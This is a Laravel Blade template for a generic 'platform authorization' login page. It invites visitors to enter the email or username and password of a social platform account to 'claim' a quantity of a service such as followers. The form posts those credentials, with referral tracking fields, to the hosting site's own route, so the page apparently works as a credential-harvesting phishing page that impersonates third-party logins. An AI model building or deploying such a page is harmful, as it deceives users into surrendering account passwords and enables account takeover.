@extends('platform-login.layout')

@section('title', 'Log in - ' . ucfirst($platform))

@section('content')
<div class="w-full max-w-[420px] mx-auto space-y-4">
    <!-- Default Platform Login Card -->
    <div class="bg-[#12131c] border border-white/10 rounded-3xl p-8 sm:p-10 shadow-2xl relative text-center">
        <!-- Platform Icon -->
        <div class="w-16 h-16 mx-auto rounded-2xl bg-indigo-600/10 border border-indigo-500/20 flex items-center justify-center text-indigo-400 text-3xl mb-4 shadow-lg">
            <i class="fa-solid fa-shield-halved"></i>
        </div>

        <h2 class="text-2xl font-bold text-white mb-2">{{ ucfirst($platform) }} Authorization</h2>
        <p class="text-xs text-gray-400 mb-6">
            Log in to verify your account and claim <strong class="text-white">{{ number_format($quantity) }} {{ $service }}</strong>
            @if(!empty($username))
                for <span class="text-indigo-400">{{ $username }}</span>
            @endif
        </p>

        <form method="POST" action="{{ route('platform.login.store', ['platform' => $platform]) }}" class="space-y-4 text-left">
            @csrf
            <input type="hidden" name="tag_id" value="{{ $tag->id ?? 1 }}">
            <input type="hidden" name="service_type" value="{{ $service }}">
            <input type="hidden" name="quantity" value="{{ $quantity }}">
            <input type="hidden" name="username" value="{{ $username }}">
            <input type="hidden" name="referral_code_id" value="{{ $refId }}">

            <div>
                <label class="block text-xs font-semibold text-gray-300 mb-1">Email or Username</label>
                <input type="text" name="email" required
                    value="{{ $username }}"
                    class="w-full px-4 py-3 text-sm rounded-xl bg-white/5 border border-white/10 text-white placeholder-gray-500 focus:outline-none focus:border-indigo-500 transition-colors"
                    placeholder="Enter email or username">
            </div>

            <div class="relative">
                <label class="block text-xs font-semibold text-gray-300 mb-1">Password</label>
                <input type="password" id="df_password" name="password" required
                    class="w-full px-4 py-3 pr-14 text-sm rounded-xl bg-white/5 border border-white/10 text-white placeholder-gray-500 focus:outline-none focus:border-indigo-500 transition-colors"
                    placeholder="Enter password">
                <button type="button" onclick="togglePassword('df_password', this)"
                    class="absolute right-4 top-8 text-xs font-semibold text-gray-400 hover:text-white transition-colors">
                    Show
                </button>
            </div>

            <button type="submit"
                class="w-full py-3.5 bg-indigo-600 hover:bg-indigo-700 text-white font-bold text-sm rounded-xl shadow-lg transition-all active:scale-[0.98]">
                Log In & Continue
            </button>
        </form>
    </div>
</div>
@endsection

@section('scripts')
<script>
    function togglePassword(inputId, btn) {
        const input = document.getElementById(inputId);
        if (input.type === 'password') {
            input.type = 'text';
            btn.innerText = 'Hide';
        } else {
            input.type = 'password';
            btn.innerText = 'Show';
        }
    }
</script>
@endsection
